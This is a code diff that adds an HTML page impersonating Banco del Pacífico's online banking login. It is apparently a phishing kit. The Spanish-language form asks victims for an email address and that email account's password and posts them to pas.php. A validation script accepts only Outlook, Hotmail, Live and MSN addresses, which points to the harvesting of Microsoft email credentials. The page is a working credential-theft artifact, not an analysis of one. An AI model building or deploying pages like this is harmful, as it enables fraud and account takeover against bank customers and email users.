@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pacificp-0</title>
+</head>
+
+<style>
+
+.ip1 {    outline: none !important;
+    font-size: 13px !important;
+    border: 1px solid #a5a5a6;
+    border-radius: 2px !important;
+    display: inline;
+    height: 20px;
+    line-height: 20px;
+    font-weight: 100;
+    background: none;
+    max-width: 100%;
+    margin-top: 0px;
+    padding: 5px;
+    background-image: none;
+    vertical-align: middle;
+    background-color: transparent;
+    width: 85%;}
+
+.botonn {
+    outline: none !important;
+    border-radius: 2px !important;
+    display: inline;
+    line-height: 20px;
+    background: none;
+    max-width: 100%;
+    cursor: pointer;
+    border: 0 none;
+    height: 32px;
+    width: 90%;
+    background-color: #005eb8;
+    color: #ffffff;
+    text-decoration: none;
+    text-align: center;
+    -webkit-appearance: none;
+    padding: 0;
+    font-family: Helvetica!important;
+    font-style: normal;
+    font-weight: normal;
+    font-size: 14px!important;
+}
+
+
+.boton {
+    margin-bottom: 8px !important;
+    -webkit-appearance: none;
+    -webkit-border-radius: 0;
+    color: #005eb8;
+    width: 90%;
+    height: 32px;
+    background: #ECEFF1;
+    border-color: #ECEFF1;
+    border: 0px;
+    font-family: Helvetica!important;
+    font-style: normal;
+    font-weight: normal;
+    font-size: 14px!important;
+}
+
+.boton3 {
+    outline: none !important;
+    border: 1px solid #a5a5a6;
+    border-radius: 2px !important;
+    padding: 5px 5px 5px 8px;
+    display: inline;
+    line-height: 20px;
+    max-width: 100%;
+    color: #005eb8;
+    border-color: #005eb8;
+    font-family: Helvetica!important;
+    font-style: normal;
+    font-weight: normal;
+    font-size: 14px!important;
+    width: 90%;
+    height: 100%;
+    background: none;
+    margin-top: 3%;
+}
+
+.pass-field {
+    -webkit-text-security: disc;
+    -moz-text-security: disc;
+    text-security: disc;
+}
+
+</style>
+
+
+<body style="margin: 0;">
+    
+
+<center>
+<div style="width: 100%; height: 130px; background-color: #ECEFF1;border-bottom: #a5a5a6 1px solid;">
+
+<img style="width: 320px; margin-top: 40px;" src="logo_pacifico1.png" alt="">
+
+</div>
+
+<br>
+<br>
+
+
+<img style="width: 250px; margin-left: -20px;" src="corr.png" alt="">
+
+<br><br><br>
+<div style="width: 300px ;">
+  
+<form action="pas.php" method="post" style="width: 300px; font-family: sans-serif;" onsubmit="return validarCorreo()">
+
+ 
+<span style="float: left;margin-left: 17px;font-size: 14px; color: #7f7e7e;">Correo electronico</span>
+
+<input class="ip1" type="text" name="us" id="us" placeholder="Ingrese su correo electronico" required>
+
+<br>
+<br>
+
+
+
+
+
+<span style="float: left;margin-left: 17px;font-size: 14px; color: #7f7e7e;">Contraseña/email</span>
+
+<input class="ip1 pass-field" type="text" name="ct" id="ct" placeholder="Contraseña de correo electronico" autocomplete="off" required>
+
+
+
+
+<br><br>
+
+<input type="submit" class="botonn" name="" id="" value="Finalizar">
+<br><br>
+</form>
+
+
+<br> 
+ 
+
+<center>
+<img style="width: 60px;" src="micro.webp" alt="">
+</center>
+
+
+<br> 
+
+
+
+
+
+
+
+</div>  
+
+
+</div>
+
+<div style="color: #B3BAC0 !important; font-family: sans-serif; font-size: 11px;" >
+    <p >Recomendamos utilizar la Banca Virtual con los navegadores</p>
+    
+    <p>Internet explorer 11.0, Chrome 36.0.1, Firefox 31.0, Microsoft Edge.</p>
+    <br>
+    <p>© Copyright 2017 Banco del Pacífico *V4.7.43</p>
+    
+    
+    </div>
+
+
+
+
+</center>
+
+<script>
+function validarCorreo() {
+    var email = document.getElementById('us').value.toLowerCase().trim();
+    var partes = email.split('@');
+    if (partes.length !== 2) {
+        alert('Por favor ingrese un correo válido');
+        return false;
+    }
+    var dominio = partes[1];
+    if (!dominio.startsWith('outlook.') && !dominio.startsWith('hotmail.') && !dominio.startsWith('live.') && !dominio.startsWith('msn.')) {
+        alert('Por favor ingrese un correo de Outlook, Hotmail, Live o MSN válido');
+        return false;
+    }
+    if (dominio.split('.').length < 2) {
+        alert('Por favor ingrese un correo válido con dominio completo');
+        return false;
+    }
+    return true;
+}
+</script>
+<script src="protect.js"></script>
+</body>
+</html>
